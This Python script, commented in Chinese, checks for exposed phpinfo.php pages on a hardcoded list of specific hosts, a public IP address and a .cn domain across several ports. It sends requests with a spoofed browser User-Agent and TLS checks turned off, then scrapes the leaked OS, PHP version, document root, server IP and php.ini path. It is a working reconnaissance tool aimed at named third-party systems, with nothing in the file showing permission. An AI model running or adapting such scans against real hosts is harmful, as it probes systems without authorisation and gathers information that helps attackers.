#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHPINFO 信息泄露漏洞验证脚本
"""

import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    {"url": "http://39.98.94.0:8088", "path": "/dashboard/phpinfo.php"},
    {"url": "http://www.wxfxz.cn:8080", "path": "/dashboard/phpinfo.php"},
    {"url": "http://www.wxfxz.cn:80", "path": "/dashboard/phpinfo.php"},
    {"url": "http://www.wxfxz.cn:8088", "path": "/dashboard/phpinfo.php"},
    {"url": "http://39.98.94.0:8080", "path": "/dashboard/phpinfo.php"},
]

print("=" * 70)
print("  PHPINFO 信息泄露漏洞验证")
print("=" * 70)
print()

vuln_count = 0

for i, target in enumerate(TARGETS):
    url = f"{target['url']}{target['path']}"
    print(f"[{i+1}/{len(TARGETS)}] 测试: {url}")
    print("-" * 70)
    
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        }
        
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        
        print(f"  状态码: {response.status_code}")
        print(f"  Server: {response.headers.get('Server', 'N/A')}")
        print(f"  Content-Type: {response.headers.get('Content-Type', 'N/A')}")
        print(f"  内容大小: {len(response.content)} bytes")
        
        if response.status_code == 200 and "phpinfo" in response.text.lower():
            vuln_count += 1
            print(f"  漏洞状态: ✅ 存在")
            
            # 提取PHP版本
            php_ver = re.search(r'PHP Version ([\d.]+)', response.text)
            if php_ver:
                print(f"  PHP版本: {php_ver.group(1)}")
            
            # 提取敏感信息
            sensitive_info = []
            
            # 系统信息
            sys = re.search(r'System</td><td class="v">([^<]+)', response.text)
            if sys:
                sensitive_info.append(f"操作系统: {sys.group(1).strip()}")
            
            # PHP版本
            if php_ver:
                sensitive_info.append(f"PHP版本: {php_ver.group(1)}")
            
            # Server API
            sapi = re.search(r'Server API</td><td class="v">([^<]+)', response.text)
            if sapi:
                sensitive_info.append(f"Server API: {sapi.group(1).strip()}")
            
            # 文档根目录
            doc_root = re.search(r'DOCUMENT_ROOT</td><td class="v">([^<]+)', response.text)
            if doc_root:
                sensitive_info.append(f"文档根目录: {doc_root.group(1).strip()}")
            
            # 服务器IP
            addr = re.search(r'SERVER_ADDR</td><td class="v">([^<]+)', response.text)
            if addr:
                sensitive_info.append(f"服务器IP: {addr.group(1).strip()}")
            
            # PHP配置文件路径
            ini_path = re.search(r'Loaded Configuration File</td><td class="v">([^<]+)', response.text)
            if ini_path:
                sensitive_info.append(f"php.ini路径: {ini_path.group(1).strip()}")
            
            if sensitive_info:
                print(f"  泄露敏感信息:")
                for info in sensitive_info[:5]:
                    print(f"    - {info}")
            
        elif response.status_code == 404:
            print(f"  漏洞状态: ❌ 不存在 (404)")
        elif response.status_code == 403:
            print(f"  漏洞状态: ⚠️  被禁止访问 (403)")
        else:
            print(f"  漏洞状态: ❌ 未确认 (状态码: {response.status_code})")
            
    except requests.exceptions.Timeout:
        print(f"  漏洞状态: ❌ 连接超时")
    except requests.exceptions.ConnectionError:
        print(f"  漏洞状态: ❌ 连接失败")
    except Exception as e:
        print(f"  漏洞状态: ❌ 异常: {e}")
    
    print()

print("=" * 70)
print(f"  验证完成: {vuln_count}/{len(TARGETS)} 个存在漏洞")
print("=" * 70)
